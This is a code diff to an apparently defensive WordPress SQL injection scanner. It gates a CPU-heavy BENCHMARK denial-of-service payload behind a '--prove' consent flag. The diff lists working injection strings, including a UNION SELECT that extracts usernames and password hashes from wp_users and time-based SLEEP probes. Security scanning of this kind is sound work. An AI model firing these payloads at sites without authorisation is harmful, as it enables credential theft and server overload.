@@ -11,12 +11,19 @@ from __future__ import annotations
 from ..http import Client
 from ..models import Finding
 
+# Standard probes — fired in aggressive mode.
 WP_PARAMS = (
-    "?p=1' AND 1=BENCHMARK(50000000,SHA1(0))--",
     "?p=1+UNION+SELECT+1,user_login,user_pass+FROM+wp_users--",
     "?meta_key=foo&meta_value=1' UNION SELECT NULL--",
     "?cat=1+OR+SLEEP(5)",
     "?author=1+OR+SLEEP(5)",
+)
+
+# BENCHMARK(50000000,…) is a server-side CPU DoS payload. Only fire it when
+# the user has also passed --prove (explicit "I own this site" consent),
+# matching the convention used by other CPU-heavy probes.
+WP_PARAMS_HEAVY = (
+    "?p=1' AND 1=BENCHMARK(50000000,SHA1(0))--",
 )
 
 
@@ -30,7 +37,8 @@ async def check(client: Client, ctx: dict) -> list[Finding]:
     base_len = len(base.content or b"") if base else 0
     base_status = base.status_code if base else 0
     hits = []
-    for p in WP_PARAMS:
+    probes = list(WP_PARAMS) + (list(WP_PARAMS_HEAVY) if ctx.get("prove") else [])
+    for p in probes:
         step(f"WP_Query probe {p}...")
         r = await client.get("/" + p)
         if r is None:
@@ -45,7 +53,7 @@ async def check(client: Client, ctx: dict) -> list[Finding]:
             hits.append((p, r.status_code, len(r.content or b"")))
     if not hits:
         return [Finding(severity="info", title="WP_Query SQLi probes — clean",
-                        evidence=f"5 WP-specific payloads tested; none altered the response.",
+                        evidence=f"{len(probes)} WP-specific payload(s) tested; none altered the response.",
                         remediation="No action.", url=ctx["target"])]
     findings.append(Finding(
         severity="high",
